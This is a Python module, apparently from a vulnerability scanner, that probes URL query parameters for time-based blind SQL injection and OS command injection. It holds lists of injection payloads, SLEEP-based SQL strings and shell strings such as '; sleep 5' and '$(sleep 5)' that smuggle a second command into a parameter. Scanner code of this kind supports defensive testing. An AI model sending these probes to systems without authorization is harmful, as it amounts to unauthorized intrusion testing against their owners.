"""Safe, non-destructive SQL Injection and OS Command Injection PoC checks.

Only time-based delay verification and benign boolean/arithmetic checks are
used. No destructive statements, data dumping, or reverse shells are ever sent.
"""

from __future__ import annotations

import time
from typing import Optional
from urllib.parse import urlencode, urlparse, urlunparse

from autosecpro.core.http_client import AsyncHttpClient
from autosecpro.core.models import Finding, ScanContext
from autosecpro.vuln.cvss import get_preset

SLEEP_SECONDS = 5
DELAY_TOLERANCE = 2.0

SQLI_TIME_PAYLOADS = [
    f"' OR SLEEP({SLEEP_SECONDS})-- -",
    f'" OR SLEEP({SLEEP_SECONDS})-- -',
    f"1' AND SLEEP({SLEEP_SECONDS}) AND '1'='1",
    f"1) OR SLEEP({SLEEP_SECONDS})-- -",
]

CMDI_TIME_PAYLOADS = [
    f"; sleep {SLEEP_SECONDS}",
    f"| sleep {SLEEP_SECONDS}",
    f"`sleep {SLEEP_SECONDS}`",
    f"$(sleep {SLEEP_SECONDS})",
]


def _inject_param(url: str, param: str, payload: str) -> str:
    """Return a copy of `url` with `param` replaced by `payload` in the query string."""
    parsed = urlparse(url)
    query_pairs = dict(pair.split("=", 1) for pair in parsed.query.split("&") if "=" in pair)
    query_pairs[param] = payload
    new_query = urlencode(query_pairs)
    return urlunparse(parsed._replace(query=new_query))


async def _timed_request(client: AsyncHttpClient, url: str) -> Optional[float]:
    start = time.monotonic()
    response = await client.get(url)
    elapsed = time.monotonic() - start
    if response is None:
        return None
    return elapsed


async def _baseline_time(client: AsyncHttpClient, url: str, param: str) -> Optional[float]:
    baseline_url = _inject_param(url, param, "1")
    return await _timed_request(client, baseline_url)


async def check_time_based_injection(
    client: AsyncHttpClient,
    url: str,
    param: str,
    payloads: list[str],
    vuln_key: str,
    finding_name: str,
    category: str,
    remediation: str,
) -> Optional[Finding]:
    """Generic time-based delay differential check for SQLi / Command Injection."""
    baseline = await _baseline_time(client, url, param)
    if baseline is None:
        return None

    for payload in payloads:
        test_url = _inject_param(url, param, payload)
        elapsed = await _timed_request(client, test_url)
        if elapsed is None:
            continue
        if elapsed - baseline >= (SLEEP_SECONDS - DELAY_TOLERANCE):
            severity, score, vector = get_preset(vuln_key)
            return Finding(
                id="",
                name=finding_name,
                category=category,
                severity=severity,
                cvss_score=score,
                cvss_vector=vector,
                url=test_url,
                parameter=param,
                evidence_poc=(
                    f"Baseline response time: {baseline:.2f}s; "
                    f"payload response time: {elapsed:.2f}s "
                    f"(delta >= {SLEEP_SECONDS - DELAY_TOLERANCE}s threshold)."
                ),
                remediation=remediation,
            )
    return None


async def run_sqli_checks(client: AsyncHttpClient, context: ScanContext) -> list[Finding]:
    """Run non-destructive time-based SQL Injection checks on discovered endpoints."""
    findings: list[Finding] = []
    for url in list(context.discovered_endpoints):
        parsed = urlparse(url)
        if not parsed.query:
            continue
        params = [pair.split("=", 1)[0] for pair in parsed.query.split("&") if "=" in pair]
        for param in params:
            finding = await check_time_based_injection(
                client,
                url,
                param,
                SQLI_TIME_PAYLOADS,
                "sqli",
                "SQL Injection (Time-Based Blind)",
                "OWASP A03:2021 - Injection",
                "Use parameterized queries / prepared statements and validate all user input server-side.",
            )
            if finding:
                findings.append(finding)
    return findings


async def run_command_injection_checks(client: AsyncHttpClient, context: ScanContext) -> list[Finding]:
    """Run non-destructive time-based OS Command Injection checks on discovered endpoints."""
    findings: list[Finding] = []
    for url in list(context.discovered_endpoints):
        parsed = urlparse(url)
        if not parsed.query:
            continue
        params = [pair.split("=", 1)[0] for pair in parsed.query.split("&") if "=" in pair]
        for param in params:
            finding = await check_time_based_injection(
                client,
                url,
                param,
                CMDI_TIME_PAYLOADS,
                "command_injection",
                "OS Command Injection (Time-Based Blind)",
                "OWASP A03:2021 - Injection",
                "Avoid passing user input to shell commands; use safe APIs and strict allow-list input validation.",
            )
            if finding:
                findings.append(finding)
    return findings
